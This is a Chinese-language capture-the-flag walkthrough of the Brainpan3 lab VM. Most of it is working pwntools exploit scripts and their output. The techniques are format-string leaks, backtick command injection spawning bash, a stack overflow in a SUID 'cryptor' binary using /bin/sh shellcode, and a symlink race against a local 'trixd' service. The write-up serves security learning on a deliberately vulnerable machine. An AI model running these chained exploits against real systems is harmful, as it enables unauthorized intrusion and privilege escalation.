可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。

``` bash
ENTER COMMAND: $ 3
SELECTED: 3
ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
--------------------------------------------------------------
SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.
\xff \x9cm\xb7\x1cϿ
```

在这里，正在研究很多重复的值。

``` bash
>>> from pwn import *
>>> unhex('252e7825')[::-1]
'%x.%'
```

看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：

``` bash
root@kali:~# python
Python 2.7.17 (default, Jan 19 2020, 19:54:54) 
[GCC 9.2.1 20200110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> for item in 'b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.'.split('.'):
...   unhex(item)
... 
'\xb7m\x9a\xc0'
'Y'
'N'
'Y'
'\xb7m\x98\xa0'
'\xb7m\x90\x00'
'\xb7m\x9a\xc0'
''
```

Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。


``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
session_name = r.recvuntil('\n').split('.')
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))
n_index = session_name.index('4e')
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
r.interactive()
```

运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 4506
[+] Opening connection to 192.168.56.117 on port 1337: Done
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 4506
[*] Report 'N' at offset 65
[*] Switching to interactive mode
\xff �r\xb7�%\x84\xbf
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: SELECTED: 3
ENTER NEW SESSION NAME: --------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: $
```

#### 第三步

``` bash
ENTER COMMAND: $ 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

$ this is my first report!

REPORT [this is my first report!@]
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20200209204930.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [dxyc/yc/}i/vybcd/bu`\x7fbd///]
```

从文字上看，报告似乎以某种方式进行了加密，并存储在/home/anansi/REPORTS/20200209204930.rep中。用于处理报告的二进制文件位于/ repo目录中，因此进行分析可能很有用，可以在尝试进行逆向工程之前先尝试一些其他的操作。经过几次模糊的尝试以查找缓冲区溢出和命令注入之后，得到以下内容：

``` bash
$ `fuck`

REPORT [`fuck`s my first report!@]
SENDING TO REPORT MODULE

sh: 1: fuck: not found
[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205212.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [��������������\xff���\xaf\xaf]
```

什么？！尝试通过反引号执行命令时，收到命令未找到错误消息。这是否意味着命令执行？

``` bash
$ `whoami`

REPORT [`whoami`my first report!@]
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205443.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [`o`orhlx>ghsru>sdqnsu>>>]
```

这可能是通过stderr实现的。可以通过管道输出到stderr来接收命令输出吗？

``` bash
$ `whoami >&2`

REPORT [`whoami >&2`irst report!@]
SENDING TO REPORT MODULE

anansi
[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205645.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [&=<;p=*? =;ppp]
```

真好！现在有趣的部分，尝试获得一个shell。

``` bash
ENTER COMMAND: $ 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

$ `/bin/bash -i >&2`

REPORT [`/bin/bash -i >&2`eport!@]
SENDING TO REPORT MODULE

bash: cannot set terminal process group (2506): Inappropriate ioctl for device
bash: no job control in this shell
anansi@brainpan3:/$ $ whoami
whoami
anansi
anansi@brainpan3:/$ $ id
id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
anansi@brainpan3:/$ $ pwd
pwd
/
anansi@brainpan3:/$ $
```

现在有一个用户shell程序！正常情况下，修改漏洞利用脚本以自动为我获取shell程序：

``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
session_name = r.recvuntil('\n').split('.')
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))
n_index = session_name.index('4e')
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))
r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')
r.interactive()
```

运行脚本能够成功的获得shell

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 6851
[*] Report 'N' at offset 65
[+] uname -a - Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
[+] whoami - anansi
[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
[*] Switching to interactive mode
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:


REPORT [$(/bin/bash -i >&2)]
SENDING TO REPORT MODULE

bash: cannot set terminal process group (2677): Inappropriate ioctl for device
bash: no job control in this shell
anansi@brainpan3:/$ $ id
id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
anansi@brainpan3:/$ $ whoami
whoami
anansi
```

#### 步骤4

假设需要进行某种特权提升，寻找SUID二进制文件：

``` bash
anansi@brainpan3:/$ $ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/home/reynard/private/cryptor
/bin/su
/bin/ping
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping6
```

突出显示的二进制文件是/home/neynard/private/cryptor。可以执行该二进制文件吗？

``` bash
anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .
cp /home/reynard/private/cryptor .
anansi@brainpan3:/home/anansi$ $ ls -la
ls -la
total 72
drwxr-xr-x 3 anansi anansi  4096 Feb  6 13:09 .
drwxr-xr-x 5 root   root    4096 May 19  2015 ..
-rw------- 1 anansi anansi   490 Feb  9 21:03 .bash_history
-rw-r--r-- 1 anansi anansi   220 May 19  2015 .bash_logout
-rw-r--r-- 1 anansi anansi  3637 May 19  2015 .bashrc
-rw-r--r-- 1 anansi anansi   675 May 19  2015 .profile
drwxrwxrwx 2 anansi anansi  4096 Feb  9 21:04 REPORTS
-rwxrwxrwx 1 root   dev      314 Feb  6 13:09 brainpan.8.gz
-rwxrwxrwx 1 anansi webdev  5568 Feb  9 21:08 cryptor
-rwxrwxrwx 1 anansi anansi   591 May 21  2015 lapinblanc.txt
-rwxrwxrwx 1 anansi webdev 12316 Feb  6 11:05 msg_admin
-rwxrwxrwx 1 anansi webdev  1104 Feb  6 12:57 rootsploit.py
-rwxrwxrwx 1 anansi webdev  7609 Feb  6 10:19 trixd
```

将此二进制文件从Brainpan3中提取到本地计算机上。看起来只允许端口8080离开服务器。如果不激活代码存储库（命令2），那么通过Python的内置网络服务器提取文件。

``` bash
anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080
python -m SimpleHTTPServer 8080
```

在我们的主机上：

``` bash
wget http://192.168.56.117:8080/cryptor
```

加密二进制文件的快速完整性检查：

``` bash
root@kali:~/vulnhub/brainpan3/2# checksec cryptor
[*] '/root/vulnhub/brainpan3/2/cryptor'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

没有canary，也没有NX。这意味着，假设发现缓冲区溢出，可以跳回到堆栈/堆上的shellcode并从那里执行payload，从而避免ROP或其他恶作剧。查看IDA中的二进制文件，可以看到缓冲区溢出情况。看到分配了100个字节的缓冲区。

![](http://ctfhacker.com/assets/images/cryptor-buff1.png)

然后检查第一个参数（argv [1]）是否小于或等于116个字节。

![](http://ctfhacker.com/assets/images/cryptor-buff2.png)

在这里，给出了将116个字节写入100字节缓冲区的情况，有可能导致溢出。有了这些知识，对其进行动态测试。打开启用了Pwndbg的gdb ./cryptor，然后将116字节的字符串与第二个垃圾字符串扔到crytor上。使用Binjitsu创建116字节的循环字符串，以帮助查明字符串溢出的位置。从静态分析中知道了应该是什么，但是拥有多个数据点总是很好。

``` bash
>>> from pwn import *
>>> cyclic(116)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab'
```

使用116字节字符串运行二进制文件。

遇到崩溃

``` bash
pwndbg> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz
Starting program: /root/vulnhub/brainpan3/2/cryptor aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz
[+] saving to aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab.enc

Program received signal SIGSEGV, Segmentation fault.
0x61616162 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x62616164 ('daab')
 ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */
 EDX  0x0
 EDI  0x636e652e ('.enc')
 ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */
 EBP  0x61616161 ('aaaa')
 ESP  0xffffd208 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
 EIP  0x61616162 ('baaa')
─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────
Invalid address 0x61616162










──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ esp  0xffffd208 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
01:0004│      0xffffd20c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
02:0008│      0xffffd210 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
03:000c│      0xffffd214 ◂— 'faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
04:0010│      0xffffd218 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
05:0014│      0xffffd21c ◂— 'haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
06:0018│      0xffffd220 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
07:001c│      0xffffd224 ◂— 'jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaab'
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0 61616162
   f 1 61616163
   f 2 61616164
   f 3 61616165
   f 4 61616166
   f 5 61616167
   f 6 61616168
   f 7 61616169
   f 8 6161616a
   f 9 6161616b
   f 10 6161616c
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x61616162)
```

太棒了，所以在循环字符串中的offset baaa崩溃了。让我们通过替换baaa来创建我们的payload，以了解我们拥有EIP的控制权。

``` bash
>>> shellcode = 'A' * cyclic_find('baaa') + 'BBBB'
>>> shellcode += 'C' * (116 - len(shellcode))
>>> print shellcode
AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

如果是正确的，应该在EIP中看到BBBB。

``` bash
pwndbg> r AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz
Starting program: /root/vulnhub/brainpan3/2/cryptor AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC zzzz
[+] saving to AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.enc

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x43434343 ('CCCC')
 ECX  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */
 EDX  0x0
 EDI  0x636e652e ('.enc')
 ESI  0xf7fb5000 ◂— insb   byte ptr es:[edi], dx /* 0x1d6d6c */
 EBP  0x41414141 ('AAAA')
 ESP  0xffffd208 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
 EIP  0x42424242 ('BBBB') <== 真的非常的牛批！！！
─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ esp  0xffffd208 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
... ↓
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0 42424242
   f 1 43434343
   f 2 43434343
   f 3 43434343
   f 4 43434343
   f 5 43434343
   f 6 43434343
   f 7 43434343
   f 8 43434343
   f 9 43434343
   f 10 43434343
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x42424242)
```

还从静态分析中注意到，第二个参数存储在位于0x804a080的全局数组中。如果将shellcode写入全局数组，则可以将EIP指向该缓冲区并可能获胜。攻击计划如下：

 - 用0x804a080覆盖返回地址BBBB
 - 在第二个参数中删除/bin/sh shellcode以获得一个shell

我们得到的测试脚本如下：

test.py
``` bash
from pwn import *

shellcode = 'A' * cyclic_find('baaa') + p32(0x804a080)
shellcode += 'C' * (116 - len(shellcode))

r = process(['./cryptor', shellcode, asm(shellcraft.sh())])

offset = cyclic_find('baaa')
buffer = 116 - len(shellcode)

binsh_shellcode = asm(shellcraft.sh())

argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)

argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))

actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)

log.info(actual_shellcode)

r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'root' in output:
        break

log.info("Shell recevied: root")

r.interactive()
```

成功利用漏洞获取了本地的shell

``` bash
root@kali:~/vulnhub/brainpan3/2# python test.py 
[+] Starting local process './cryptor': pid 20596
[*] ./cryptor $(python -c 'print "A" * 4 + "\x80\xa0\x04\x08" + "C" * 0') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
[*] Shell recevied: root
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
```

在本地获得了一个shell。现在必须在服务器上执行此命令。为此，在现有脚本中创建命令，然后从脚本中发送命令。该完善后的脚本如下所示：


``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
session_name = r.recvuntil('\n').split('.')
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))
n_index = session_name.index('4e')
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))
r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')
offset = cyclic_find('baaa')
shellcode = 'A' * cyclic_find('baaa') + p32(0x804a080)
buffer = 116 - len(shellcode)
binsh_shellcode = asm(shellcraft.sh())
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)
log.info(actual_shellcode)
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break
log.info("Shell recevied: reynard")
r.interactive()
```

运行上面的脚本之后，等待一小会儿，将会接收到一个reynard的shell

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 2919
[*] Report 'N' at offset 65
[+] uname -a - Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
[+] whoami - anansi
[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
[*] ./cryptor $(python -c 'print "A" * 4 + "\x80\xa0\x04\x08" + "C" * 108') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
[*] Shell recevied: reynard
[*] Switching to interactive mode
$ id
uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
$ whoami
reynard
$ pwd
/home/reynard/private
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub207.jpg)

#### 步骤5

再进行一次勘测，将显示以下cron作业：

``` bash
$ cat /etc/cron.d/*
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
```

查看/opt/.messenger的特权，看到以下内容：

``` bash
$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 19  2015 .
drwxr-xr-x 21 root root 4096 Jun 17  2015 ..
drwxrwx---  3 root dev  4096 Feb  6 13:04 .messenger
```

看到一个由root执行的命令，该命令从/opt/.messenger目录中提取文件。为此，需要具有开发人员组权限的用户。检查/etc/passwd的尾部，可以看到puck。看他的id：

``` bash
$ id puck
uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
```

他确实具有dev特权，允许他访问/opt/.messenger。来看看box上的puck用户。

``` bash
$ cd /home/puck
$ ls -la
total 12
drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .
drwxr-xr-x 3 root    root    4096 May 19 23:35 ..
-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt
$ cat key.txt
9H37B81HZYY8912HBU93
```

box上还有其他key吗？

``` bash
$ find / -name key* 2>/dev/null
/mnt/usb/key.txt
```

不知道这些key是做什么用的。碰到一个小路障会做什么？侦察！查看netstat，看到另一个服务处于活动状态：

``` bash
$ netstat -antop | grep LIST
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
```

连接到它

``` bash
$ nc localhost 7075
open: No such file or directory
Incorrect key
```

不知道它来自什么服务，执行一个系统范围的字符串来尝试查找导致此问题的二进制文件。

``` bash
$ find / -executable > exes
$ for f in $(cat exes); do echo $f >> output; strings $f | grep "Incorrect key" >> output; done
$ grep Incorrect output -B1
/usr/local/sbin/trixd
Incorrect key
```

并确认

``` bash
$ strings /usr/local/sbin/trixd | grep Incorrect
Incorrect key
```

将trixd加载到IDA中，看到二进制文件正在检查/mnt/usb/key.txt是否为符号链接，如果是，则立即退出。从这里，它同时打开/mnt/usb/key.txt和/home/puck/key.txt并检查它们是否相同。如果它们相同，将得到一个/bin/sh shell。否则，会看到错误的密钥消息。解决此问题的方法是连接到服务，删除/mnt/usb/key.txt，然后将/home/puck/key.txt符号链接到/mnt/usb/key.txt。如果时间安排正确，将在检查后进行符号链接，绕过它。不想将binjitsu放在VM本身上，可以在这部分使用标准库函数。再次，为了通过一个脚本来完成这项工作，将一个脚本写入磁盘并执行该脚本，以使的shell具有puck的功能。的新代码如下：

``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
session_name = r.recvuntil('\n').split('.')
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))
n_index = session_name.index('4e')
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))
r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')
offset = cyclic_find('baaa')
shellcode = 'A' * cyclic_find('baaa') + p32(0x804a080)
buffer = 116 - len(shellcode)
binsh_shellcode = asm(shellcraft.sh())
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)
log.info(actual_shellcode)
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break
log.info("Shell recevied: reynard")
r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

subprocess.check_output(['touch', '/mnt/usb/key.txt'])

r = socket.socket()
r.connect((HOST, PORT))

os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")

r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("Shell received: {}".format(output))
sleep(1)
r.interactive()
```

运行上面的代码之后，成功的拿到了puck用户的权限

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 2796
[*] Report 'N' at offset 65
[+] uname -a - Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
[+] whoami - anansi
[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
[*] ./cryptor $(python -c 'print "A" * 4 + "\x80\xa0\x04\x08" + "C" * 108') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
[*] Shell recevied: reynard
[+] Shell received: puck
[*] Switching to interactive mode
$ id
uid=1001(puck) gid=1004(dev) groups=1001(puck)
$ whoami
